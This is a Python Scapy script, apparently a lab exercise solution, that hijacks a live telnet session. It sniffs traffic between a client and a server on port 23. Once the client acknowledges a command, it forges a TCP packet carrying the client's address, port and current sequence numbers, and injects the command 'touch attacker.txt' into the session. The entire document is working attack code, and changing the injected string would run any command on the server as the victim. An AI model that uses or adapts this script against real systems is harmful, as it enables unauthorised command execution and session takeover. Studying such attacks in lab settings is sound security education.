from scapy.all import *
from scapy.layers.inet import IP, TCP

counter = 0
IP_Server = "10.0.2.6" # server's IP address
Port_Server = 23 # server's port
IP_Client = "10.0.2.5"
Port_Client = 39628 #src port changes everytime you open a new telnet session

def pkt_to_json(pkt): #take a single parameter , named pkt
   
    json_packet = {} # EMPTY JSON ------ HERE I STORE THE FINAL JSON 
    xlayer = None # KEEPS TRACK OF THE CURRENT LAYER BEING PROCESSED 
    for line in pkt.split('\n'): # \n split it by using new line
        if line.startswith("###["): # beggining of a new layer ------ when true stores in c layer
            xlayer = line.replace("###[", '').replace("]###", '').strip().lower()
        else:
            keyval = line.split("=") # key value pair ----- stored in json
            if len(keyval) == 2:
                if xlayer not in json_packet:
                    json_packet[xlayer] = {}
                json_packet[xlayer][keyval[0].strip()] = keyval[1].strip()
    return json_packet

previous_from_cl = None # this is the variable which stores the previous load of the client 


def packet_listen_callback(pkt):
    global counter, IP_Server, Port_Server, IP_Client, Port_Client, previous_from_cl
    counter += 1
    print("---------------- " + str(counter) + " ------------------")
    true_packet = pkt_to_json(pkt.show(dump=True)) # CONVERT PACKET TO JSON FORMAT 
    print('seq: ' + true_packet['tcp']['seq'])
    print('ack: ' + true_packet['tcp']['ack'])
    print('flg: ' + true_packet['tcp']['flags'])
    print('prv: ' + str(previous_from_cl))
    if true_packet['ip']['dst'] == IP_Server:   # CHECK DESTINATION HOST 
        if IP_Client is None or Port_Client is None:     # Handle Incoming Packets to Server
            # Save victim info so we can use later to craft our message
            IP_Client = true_packet['ip']['src']
            Port_Client = int(true_packet['tcp']['sport'])
        print("TO host\t" + true_packet['ip']['dst'])   #Print Destination Host and Send New Message
        # We wait for "A" flag - when user has acknowledged a response from the server.
        # Therefore we wait for the last known payload to be '\r\x00'.
        if previous_from_cl is not None and '\\r\\x00' in previous_from_cl and true_packet['tcp']['flags'] == 'A':   #Check for "A" Flag and Previous Payload
            payload = "touch attacker.txt\r\x00"                      # The command to be sent.Craft and Send New Packet to Server
            seq = int(true_packet['tcp']['seq'])
            ack = int(true_packet['tcp']['ack'])
            print("------------- SENDING ---------------")
            print("Sending " + payload, flush=True)

            #Retrieves the TCP sequence and acknowledgment numbers from the current packet.
            ip = IP(src=IP_Client, dst=IP_Server)  
            # Send with PA flag - 'please ack'. But we don't need to care about result.
            tcp = TCP(sport=Port_Client, dport=Port_Server, flags="PA", seq=seq, ack=ack)
            pkt = ip / tcp / payload
            send(pkt, verbose=0)
        # To server - not part of the scope but we can listen to raw data sent
        if 'raw' in true_packet:
            print('dat: ' + true_packet['raw']['load'])
            # Update previous payload for next packet
            previous_from_cl = true_packet['raw']['load']
    else:  
        print("FROM server\t" + true_packet['ip']['src'])   #Handle Outgoing Packets from Server
        if 'raw' in true_packet:
            print('dat: ' + true_packet['raw']['load'])


sniff(filter="tcp and host " + IP_Server + " and tcp port " + str(Port_Server), prn=packet_listen_callback)   # Initiates packet sniffing using Scapy's sniff function. It filters packets based 
                                                                                                                #on TCP protocol